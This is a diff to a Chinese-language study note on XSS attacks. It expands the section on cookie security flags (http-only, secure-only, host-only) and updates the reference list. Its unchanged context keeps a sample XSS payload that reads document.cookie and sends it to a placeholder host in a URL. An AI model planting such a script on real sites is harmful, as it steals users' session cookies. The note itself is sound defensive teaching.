@@ -37,8 +37,12 @@ XSS常见攻击：
 var cookie = document.cookie; // 获取浏览器的cookie值
 window.location.herf = 'http://127.0.0.1/index.php?cookie=' + cookie;
 ```
-### httponly
-给cookie设置httponly，使得在客户端无法通过js脚本来操作cookie，防止用户账号被盗。
+### cookie安全策略
+在服务器端设置cookie的时候设置 http-only, 这样就可以防止用户通过JS获取cookie。对cookie的读写或发送一般有如下字段进行设置：
+* http-only: 使得在客户端无法通过js脚本来操作cookie(document.cookie会显示http-only的cookie项被自动过滤掉)，只允许http或https请求读取cookie，防止用户账号被盗。发送请求时自动发送cookie。
+* secure-only: 只允许https请求读取，发送请求时自动发送cookie。
+* host-only: 只允许主机域名与domain设置完成一致的网站才能访问该cookie。
+
 ## 劫持流量实现恶意跳转
 这个很简单，就是在网页中想办法插入一句像这样的语句：
 ```html
@@ -55,13 +59,14 @@ window.location.herf = 'http://127.0.0.1/index.php?cookie=' + cookie;
 ## 利用与绕过
 
 ## 参考文档
-1. [根据白名单过滤HTML(防止 XSS 攻击)](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)
-2. [XSS攻击原理分析与防御技术](https://segmentfault.com/a/1190000013315450)
-3. [浅谈XSS攻击的那些事（附常用绕过姿势）](https://zhuanlan.zhihu.com/p/26177815)
-4. [与《Yii框架》不得不说的故事—安全篇](https://www.imooc.com/learn/467)
-4. [Web安全-XSS](https://www.imooc.com/learn/812)
-5. [WEB安全 - 认识与防御XSS攻击](https://www.cnblogs.com/HCJJ/p/9468871.html)
-6. [web安全之XSS攻击原理及防范](https://www.cnblogs.com/tugenhua0707/p/10909284.html)
-7. [Yii框架不得不说的故事—安全篇（3）](https://www.imooc.com/learn/467)
-8. [Web安全-XSS](https://www.imooc.com/learn/812)
-9. [浅说 XSS 和 CSRF](https://github.com/dwqs/blog/issues/68)
+1. [前端安全系列（一）：如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)
+2. [根据白名单过滤HTML(防止 XSS 攻击)](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)
+3. [XSS攻击原理分析与防御技术](https://segmentfault.com/a/1190000013315450)
+4. [浅谈XSS攻击的那些事（附常用绕过姿势）](https://zhuanlan.zhihu.com/p/26177815)
+5. [与《Yii框架》不得不说的故事—安全篇](https://www.imooc.com/learn/467)
+6. [Web安全-XSS](https://www.imooc.com/learn/812)
+7. [WEB安全 - 认识与防御XSS攻击](https://www.cnblogs.com/HCJJ/p/9468871.html)
+8. [web安全之XSS攻击原理及防范](https://www.cnblogs.com/tugenhua0707/p/10909284.html)
+9. [Yii框架不得不说的故事—安全篇（3）](https://www.imooc.com/learn/467)
+10. [Web安全-XSS](https://www.imooc.com/learn/812)
+11. [浅说 XSS 和 CSRF](https://github.com/dwqs/blog/issues/68)
